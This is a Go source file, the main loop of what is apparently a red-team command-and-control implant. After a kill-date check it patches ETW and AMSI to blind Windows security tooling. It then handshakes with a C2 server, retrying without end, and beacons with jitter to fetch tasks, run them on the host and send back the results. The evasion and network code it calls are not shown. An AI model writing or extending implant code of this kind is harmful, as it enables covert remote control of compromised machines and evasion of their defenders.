package main

import (
	"log"
	"os"
	"time"
)

// debugMode is set via -ldflags "-X main.debugMode=true" for dev builds.
// Defaults to empty (off) for production. No logging output by default.
var debugMode = ""

func debugLog(format string, args ...any) {
	if debugMode == "true" {
		log.Printf("[dbg] "+format, args...)
	}
}

func main() {
	// Kill date check — exit silently if past the engagement window.
	if killDate != "" {
		if kd, err := time.Parse("2006-01-02", killDate); err == nil {
			if time.Now().After(kd) {
				os.Exit(0)
			}
		}
	}

	// Patch ETW and AMSI before any network or process activity.
	applyEvasions()

	// Initialise: gather host info and perform ECDH handshake with the server.
	// Retry with exponential backoff — the target might reboot or the C2 might
	// not be up yet. Never give up.
	backoff := 5 * time.Second
	const maxBackoff = 5 * time.Minute

	for {
		err := InitImplant()
		if err == nil {
			break
		}
		debugLog("init failed: %v — retrying in %s", err, backoff)
		time.Sleep(backoff)
		// Exponential backoff with cap.
		backoff *= 2
		if backoff > maxBackoff {
			backoff = maxBackoff
		}
	}
	debugLog("implant ready — id=%s", implantID)

	// Beacon loop.
	for {
		// Determine sleep interval; prefer the value updated by a sleep task.
		sleep := time.Duration(currentSleep.Load())
		if sleep == 0 {
			sleep = GetSleepDuration()
		}
		time.Sleep(sleep + GetJitter())

		// Check in with the C2.
		task, err := CheckIn()
		if err != nil {
			debugLog("check-in error: %v", err)
			continue
		}
		if task == nil {
			continue
		}
		debugLog("received task id=%s type=%s", task.ID, task.Type)

		// Execute and ship the result.
		result := ExecuteTask(task)
		if err := SendResult(result); err != nil {
			debugLog("send result error: %v", err)
		}
	}
}
